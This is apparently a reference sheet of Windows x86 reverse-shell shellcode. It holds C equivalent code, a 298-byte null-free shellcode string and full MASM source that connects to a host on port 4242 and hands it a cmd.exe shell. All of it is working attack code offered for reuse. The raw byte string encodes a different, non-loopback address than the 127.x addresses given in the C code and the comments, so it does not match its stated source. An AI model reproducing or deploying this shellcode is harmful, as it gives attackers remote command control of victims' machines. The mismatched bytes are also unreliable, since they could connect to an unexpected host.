# Windows Shellcode

## Reverse Shell

- Equivalent C code
    ```c
    WSADATA wsaData;
    WSAStartup(0, &wsaData);
    SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4242);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    connect(sockt, (struct sockaddr *)&addr, sizeof(addr));
    STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
    CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
    ```
- x86
    - Null Free, 298 bytes
        - `"\x33\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x03\xd3\x8b\x52\x78\x03\xd3\x8b\x72\x20\x03\xf3\x33\xc9\x49\x41\xad\x03\xc3\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x8b\x72\x24\x03\xf3\x66\x8b\x0c\x4e\x8b\x72\x1c\x03\xf3\x8b\x3c\x8e\x03\xfb\x53\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd7\x66\x53\x66\x68\x6c\x6c\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\xd0\x96\x66\x53\x66\x68\x75\x70\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x56\xff\xd7\x33\xc9\x66\xb9\x90\x01\x2b\xe1\x54\x51\xff\xd0\x66\x53\x66\x68\x74\x41\x68\x6f\x63\x6b\x65\x68\x57\x53\x41\x53\x54\x56\xff\xd7\x33\xc9\x51\x51\x51\x6a\x06\x6a\x01\x6a\x02\xff\xd0\x95\x68\x01\x65\x63\x74\xc1\x2c\x24\x08\x68\x63\x6f\x6e\x6e\x54\x56\xff\xd7\x68\xb2\x80\x12\x7a\x66\x68\x10\x92\x66\x6a\x02\x8b\xcc\x6a\x10\x51\x55\xff\xd0\x53\x66\x68\x73\x41\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x53\xff\xd7\x68\x01\x63\x6d\x64\xc1\x2c\x24\x08\x8b\xdc\x83\xec\x10\x8b\xfc\x55\x55\x55\x33\xd2\x52\x52\xb6\x01\x52\x33\xd2\x6a\x09\x59\x52\xe2\xfd\x52\x6a\x44\x8b\xd4\x57\x52\x51\x51\x51\x6a\x01\x51\x51\x53\x51\xff\xd0"`
        - Source code
            ```
            .386
            .model flat, stdcall
            option  CaseMap:None

            .code
            main PROC
                ASSUME FS:NOTHING

                ; Find kernel32.dll base address
                xor ecx, ecx
                mov eax, [fs:30h + ecx]
                mov eax, [eax + 0Ch]
                mov esi, [eax + 14h]
                lodsd
                xchg eax, esi
                lodsd
                xchg eax, esi
                lodsd
                mov ebx, [eax + 10h]

                ; Find kernel32.dll export table
                mov edx, [ebx + 3Ch]
                add edx, ebx
                mov edx, [edx + 78h]
                add edx, ebx
                mov esi, [edx + 20h]
                add esi, ebx

                ; Find GetProcAddress function name
                xor ecx, ecx
                dec ecx
                loop_name:
                    inc ecx
                    lodsd
                    add eax, ebx
                    cmp dword ptr [eax], 50746547h
                    jnz loop_name
                    cmp dword ptr [eax + 4h], 41636F72h
                    jnz loop_name

                ; Find GetProcAddress address
                mov esi, [edx + 24h]
                add esi, ebx
                mov cx, word ptr [esi + ecx * 2]
                mov esi, [edx + 1Ch]
                add esi, ebx
                mov edi, [esi + ecx * 4]
                add edi, ebx

                ; GetProcAddress(kernel32.dll, "LoadLibraryA")
                push ebx
                push 41797261h
                push 7262694Ch
                push 64616F4Ch
                push esp
                push ebx
                call edi

                ; LoadLibrary("ws2_32.dll")
                pushw bx
                pushw 6C6Ch
                push 642E3233h
                push 5F327377h
                push esp
                call eax

                ; GetProcAddress(ws2_32.dll, "WSAStartup")
                xchg eax, esi
                pushw bx
                pushw 7075h
                push 74726174h
                push 53415357h
                push esp
                push esi
                call edi

                ; WSAStartUp(0, &wsaData)
                xor ecx, ecx
                mov cx, 190h
                sub esp, ecx
                push esp
                push ecx
                call eax

                ; GetProcAddress(ws2_32.dll, "WSASocketA")
                pushw bx
                pushw 4174h
                push 656B636Fh
                push 53415357h
                push esp
                push esi
                call edi

                ; sockt = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)
                xor ecx, ecx
                push ecx
                push ecx
                push ecx
                push 6
                push 1
                push 2
                call eax

                ; GetProcAddress(ws2_32.dll, "connect")
                xchg eax, ebp
                push 74636501h
                shr dword ptr [esp], 8
                push 6e6e6f63h
                push esp
                push esi
                call edi

                ; connect(sockt, [AF_INET, port, ip], sizeof(struct sockaddr))
                ; Host: 127.1.1.1, Port: 4242
                push 0101017Fh
                pushw 9210h
                pushw 02h
                mov ecx, esp
                push 10h
                push ecx
                push ebp
                call eax

                ; GetProcAddress(kernel32.dll, "CreateProcessA")
                push ebx
                pushw 4173h
                push 7365636Fh
                push 72506574h
                push 61657243h
                push esp
                push ebx
                call edi

                ; ebx = "cmd"
                push 646D6301h
                shr dword ptr [esp], 8
                mov ebx, esp

                ; edi = &pinfo
                sub esp, 10h
                mov edi, esp

                ; edi = &sinfo
                push ebp
                push ebp
                push ebp
                xor edx, edx
                push edx
                push edx
                mov dh, 1
                push edx
                xor edx, edx
                push 09h
                pop ecx
                rep9:
                    push edx
                    loop rep9
                push edx
                push 44h
                mov edx, esp

                ; CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                push edi
                push edx
                push ecx
                push ecx
                push ecx
                push 1
                push ecx
                push ecx
                push ebx
                push ecx
                call eax
                
            main ENDP

            END main
            ```
